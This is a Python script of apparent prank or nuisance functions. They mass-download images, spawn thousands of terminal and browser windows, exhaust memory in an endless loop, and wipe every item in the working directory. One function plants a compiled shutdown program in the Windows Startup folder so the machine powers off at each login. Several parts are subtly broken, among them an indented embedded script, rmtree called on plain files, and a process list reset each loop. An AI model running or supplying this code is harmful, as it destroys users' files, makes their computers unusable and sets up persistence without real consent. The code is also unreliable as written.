import multiprocessing
import requests
import os
import shutil
import numpy as np
import webbrowser


def Multiple_img_Downloader(count: int = 10000):
    URL = "https://picsum.photos/5000/10000"

    def download(url, name):
        response = requests.get(url)
        open(f'{name}.jpg', 'wb').write(response.content)

    for a in range(count):
        files = []

        j = multiprocessing.Process(target=download, args=[URL, a])
        j.start()
        files.append(j)

    for _ in files:
        j.join()


def Create_Files(extension: str, count: int = 10000, content: str = ""):
    for num in range(count):
        with open(f"{num}.{extension}", "w") as f:
            f.write(content)


def Delete_Files():
    for file in os.listdir():
        shutil.rmtree(file)


def Spam_Windows(count: int = 10000):
    for i in range(count):
        os.system("start cmd")


def Spam_Linux(count: int = 10000):
    for i in range(count):
        os.system("gnome-terminal")


def ShutdownOnStart():
    choice = input('This Function can cause Trouble to your pc!!\n Do you want to continue [Y/n]: ').lower()

    if choice == 'y':
        os.chdir(f'C:/Users/{os.getenv("USERNAME")}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
        with open('DANGER.py', 'w') as f:
            f.write('''
            import os
            os.system('shutdown /s /t 0')
            ''')
        os.system('pyinstaller --onefile DANGER.py')

        shutil.rmtree('DANGER.py')
        shutil.rmtree('build')
        shutil.rmtree('DANGER.spec')

        os.chdir('dist')
        shutil.move('DANGER.exe', '..')
        os.chdir('..')

        shutil.rmtree('dist')
    else:
        print('Stopping...')


def Crash_by_Numbers():
    i = 1
    while True:
        i *= 3
        print(np.random.rand(i))
        print(np.array(0, i))


def Open_BrowserWins(count: int = 10000):
    for i in range(count):
        webbrowser.open_new('https://www.google.com')

